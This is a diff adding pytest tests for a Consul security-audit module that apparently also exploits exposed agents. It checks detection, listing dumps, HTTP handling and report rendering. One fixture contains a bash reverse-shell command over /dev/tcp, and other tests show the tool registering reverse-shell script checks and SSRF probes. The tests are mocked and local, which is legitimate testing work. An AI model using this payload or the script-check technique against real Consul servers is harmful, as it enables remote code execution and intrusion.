+        delete_revshell=False,
+        revshell_listen=False,
+        revshell_host=None,
+        revshell_port=None,
+        revshell_payload=None,
+        revshell_check_id=None,
+        debug=True,
+        run_deep_checks=False,
+    )
+    assert detect_only["status"] == "open_no_auth"
+    assert any("detect-only result=open_no_auth" in event for event in (detect_only.get("debug_events") or []))
+
+
+def test_run_consul_stage_dump_all_inference(monkeypatch: pytest.MonkeyPatch) -> None:
+    _ConsoleCapture.instances.clear()
+    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
+    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_a, **_k: [8500])
+    monkeypatch.setattr(
+        consul,
+        "collect_scan_target_specs",
+        lambda *_a, **_k: [SimpleNamespace(host="127.0.0.1", scheme="", explicit_port=None)],
+    )
+    monkeypatch.setattr(
+        consul,
+        "build_scan_execution_groups",
+        lambda *_a, **_k: [SimpleNamespace(hosts=["127.0.0.1"], port=8500, scheme_hint=None)],
+    )
+    captured: list[dict[str, object]] = []
+
+    def fake_audit(**kwargs):  # type: ignore[no-untyped-def]
+        captured.append(kwargs)
+        return (1, 1, 0, False)
+
+    monkeypatch.setattr(consul, "audit_consul_targets", fake_audit)
+    rc = consul.run_consul_stage(_consul_args(debug=True, dump=True), logger=object())  # type: ignore[arg-type]
+    assert rc == 0
+    assert captured
+    assert captured[0]["dump_all_requested"] is True
+    assert captured[0]["show_services"] is True
+    assert captured[0]["show_agents"] is True
+    assert captured[0]["show_checks"] is True
+    assert captured[0]["show_nodes"] is True
+
+
+def test_run_consul_stage_multi_port_uses_single_global_progress(monkeypatch: pytest.MonkeyPatch) -> None:
+    _ConsoleCapture.instances.clear()
+    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
+    monkeypatch.setattr(consul, "collect_scan_ports", lambda *_a, **_k: [8500, 8501])
+    monkeypatch.setattr(
+        consul,
+        "collect_scan_target_specs",
+        lambda *_a, **_k: [SimpleNamespace(host="127.0.0.1", scheme="", explicit_port=None)],
+    )
+    monkeypatch.setattr(
+        consul,
+        "build_scan_execution_groups",
+        lambda *_a, **_k: [
+            SimpleNamespace(hosts=["127.0.0.1"], port=8500, scheme_hint=None),
+            SimpleNamespace(hosts=["127.0.0.1"], port=8501, scheme_hint=None),
+        ],
+    )
+
+    class _FakeProgress:
+        instances: list[_FakeProgress] = []
+
+        def __init__(self, _label: str, total: int, *, enabled: bool = True, leave: bool = True) -> None:
+            _ = (enabled, leave)
+            self.total = total
+            self.advances: list[int] = []
+            self.closed = False
+            type(self).instances.append(self)
+
+        def advance(self, step: int = 1) -> None:
+            self.advances.append(int(step))
+
+        def close(self) -> None:
+            self.closed = True
+
+    monkeypatch.setattr(consul, "ProgressBar", _FakeProgress)
+
+    captured: list[dict[str, Any]] = []
+
+    def fake_audit(**kwargs):  # type: ignore[no-untyped-def]
+        captured.append(kwargs)
+        return (len(kwargs["hosts"]), 1, 0, False)
+
+    monkeypatch.setattr(consul, "audit_consul_targets", fake_audit)
+
+    rc = consul.run_consul_stage(_consul_args(), logger=object())  # type: ignore[arg-type]
+    assert rc == 0
+    assert len(captured) == 2
+    assert all(call["show_progress"] is False for call in captured)
+    assert len(_FakeProgress.instances) == 1
+    progress = _FakeProgress.instances[0]
+    assert progress.total == 2
+    assert progress.advances == [1, 1]
+    assert progress.closed is True
+
+
+def test_ssl_context_and_http_request_branches(monkeypatch: pytest.MonkeyPatch) -> None:
+    class _Resp:
+        status = 200
+        headers = {"X-Test": "ok"}
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, exc_type, exc, tb) -> bool:  # type: ignore[no-untyped-def]
+            _ = (exc_type, exc, tb)
+            return False
+
+        def read(self) -> bytes:
+            return b'{"ok":true}'
+
+    assert consul._ssl_context(use_https=False, insecure=False) is None
+    strict_ctx = consul._ssl_context(use_https=True, insecure=False)
+    insecure_ctx = consul._ssl_context(use_https=True, insecure=True)
+    assert strict_ctx is not None and strict_ctx.verify_mode == ssl.CERT_REQUIRED
+    assert insecure_ctx is not None and insecure_ctx.verify_mode == ssl.CERT_NONE
+
+    monkeypatch.setattr(consul.urllib.request, "urlopen", lambda *_a, **_k: _Resp())
+    status, payload, headers, error = consul._http_request(
+        "127.0.0.1",
+        8500,
+        "GET",
+        "/v1/status/leader",
+        1.0,
+        use_https=False,
+        insecure=False,
+        headers={"X-Test": "1"},
+    )
+    assert status == 200 and error is None
+    assert b'"ok"' in payload
+    assert headers["x-test"] == "ok"
+
+    http_error = urllib.error.HTTPError(
+        "http://127.0.0.1:8500/v1/status/leader",
+        403,
+        "Forbidden",
+        {"X-Err": "yes"},
+        io.BytesIO(b'{"error":"denied"}'),
+    )
+    monkeypatch.setattr(consul.urllib.request, "urlopen", lambda *_a, **_k: (_ for _ in ()).throw(http_error))
+    status2, payload2, headers2, error2 = consul._http_request(
+        "127.0.0.1",
+        8500,
+        "GET",
+        "/v1/status/leader",
+        1.0,
+        use_https=False,
+        insecure=False,
+    )
+    assert status2 == 403 and error2 is None
+    assert b"denied" in payload2 and headers2["x-err"] == "yes"
+
+    monkeypatch.setattr(
+        consul.urllib.request,
+        "urlopen",
+        lambda *_a, **_k: (_ for _ in ()).throw(urllib.error.URLError(TimeoutError("timed out"))),
+    )
+    status3, payload3, headers3, error3 = consul._http_request(
+        "127.0.0.1",
+        8500,
+        "GET",
+        "/v1/status/leader",
+        1.0,
+        use_https=True,
+        insecure=False,
+    )
+    assert status3 == 0 and payload3 == b"" and headers3 == {}
+    assert error3 == "connection timeout"
+
+
+def test_render_colored_consul_line_and_revshell_detail_variants() -> None:
+    class _ColorConsole:
+        def __init__(self) -> None:
+            self.lines: list[str] = []
+
+        def _paint(self, text: str, color: str, _stream) -> str:  # type: ignore[no-untyped-def]
+            return f"<{color}>{text}</{color}>"
+
+        def plain(self, line: str, color: str | None = None) -> None:
+            _ = color
+            self.lines.append(line)
+
+    console = _ColorConsole()
+    rendered = consul._render_colored_consul_line(
+        console, "CONSUL\t127.0.0.1\t8500\t [*] Consul Agent (auth required:True) (kv:3)"
+    )
+    assert rendered is True
+    assert console.lines and "bright_green" in console.lines[0]
+
+    assert consul._render_colored_consul_line(console, "OTHER\t127.0.0.1\t8500\t[*] skip") is False
+
+    rec_left_registered = {
+        "host": "127.0.0.1",
+        "port": 8500,
+        "is_consul": True,
+        "script_revshell": {
+            "action": "create",
+            "listener": "127.0.0.1:4444",
+            "script": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
+            "registered": True,
+            "check_id": "rp-1",
+            "wait_seconds": 1.2,
+            "auto_cleanup": False,
+        },
+    }
+    lines_left = consul._detail_lines(rec_left_registered, "txt")
+    joined_left = "\n".join(lines_left)
+    assert "Reverse-shell script-check" in joined_left
+    assert "check left registered" in joined_left
+
+    rec_register_failed = {
+        "host": "127.0.0.1",
+        "port": 8500,
+        "is_consul": True,
+        "script_revshell": {
+            "action": "create",
+            "registered": False,
+            "register_status": 403,
+        },
+    }
+    lines_fail = consul._detail_lines(rec_register_failed, "txt")
+    assert any("check register failed err=status=403" in line for line in lines_fail)
+
+
+def test_consul_checks_and_health_error_paths(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (500, {"x": 1}, None, False, False))
+    status, payload, error = consul._consul_get_checks(
+        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
+    )
+    assert status == 500 and payload is None and error == "status=500"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, "bad", None, False, False))
+    status2, payload2, error2 = consul._consul_get_checks(
+        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
+    )
+    assert status2 == 200 and payload2 is None and error2 == "invalid checks response"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (403, None, None, False, False))
+    instances, instances_error = consul._consul_health_service_instances(
+        "127.0.0.1",
+        8500,
+        "web",
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        agent_checks=None,
+    )
+    assert instances is None and instances_error == "Forbidden"
+
+    monkeypatch.setattr(consul, "_consul_get_json_any", lambda *_a, **_k: (200, {"bad": "shape"}, None, False, False))
+    instances2, instances_error2 = consul._consul_health_service_instances(
+        "127.0.0.1",
+        8500,
+        "web",
+        1.0,
+        scheme="http",
+        insecure=False,
+        headers=None,
+        agent_checks=None,
+    )
+    assert instances2 is None and instances_error2 == "invalid health service response"
+
+
+def test_detail_lines_branch_matrix_for_errors_and_cleanup() -> None:
+    record = {
+        "host": "127.0.0.1",
+        "port": 8500,
+        "is_consul": True,
+        "anonymous_scopes": {"kv": {"ok": False, "count": 0, "status": 403, "error": "denied"}},
+        "keys_requested": True,
+        "dump_requested": False,
+        "kv_keys_list": None,
+        "kv_keys_error": "forbidden",
+        "dump_all_requested": False,
+        "services_list_requested": True,
+        "services_list": None,
+        "services_list_error": "forbidden",
+        "agents_list_requested": True,
+        "agents_list": [],
+        "agent_dump_name": "node-404",
+        "checks_list_requested": True,
+        "checks_list": [],
+        "check_dump_id": "check-404",
+        "nodes_list_requested": True,
+        "nodes_list": None,
+        "nodes_list_error": "forbidden",
+        "service_result": {"name": "web", "action": "delete", "ok": False, "error": "denied", "status": 403},
+        "ssrf_results": [
+            {
+                "target_url": "http://127.0.0.1:9100/metrics",
+                "registered": False,
+                "register_error": "status=500",
+                "poll_error": "timeout",
+                "deregistered": False,
+                "deregister_error": "status=500",
+            }
+        ],
+        "script_revshell": {
+            "action": "delete",
+            "target_check_id": "rp-check",
+            "queried": True,
+            "matched": 2,
+            "deleted": 1,
+            "items": [
+                {"check_id": "rp-check", "ok": True},
+                {"check_id": "rp-check-2", "ok": False, "status": 403},
+            ],
+        },
+    }
+    lines = consul._detail_lines(record, "txt", debug=True)
+    joined = "\n".join(lines)
+    assert "keys unavailable err=forbidden" in joined
+    assert "services unavailable err=forbidden" in joined
+    assert "<agent not found>" in joined
+    assert "<check not found>" in joined
+    assert "nodes unavailable err=forbidden" in joined
+    assert "service delete failed err=denied status=403" in joined
+    assert "check register failed err=status=500" in joined
+    assert "probe failed err=timeout" in joined
+    assert "check deregister failed err=status=500" in joined
+    assert "matched=2 deleted=1" in joined
+    assert "check deregistered id=rp-check" in joined
+    assert "check deregister failed id=rp-check-2 err=status=403" in joined
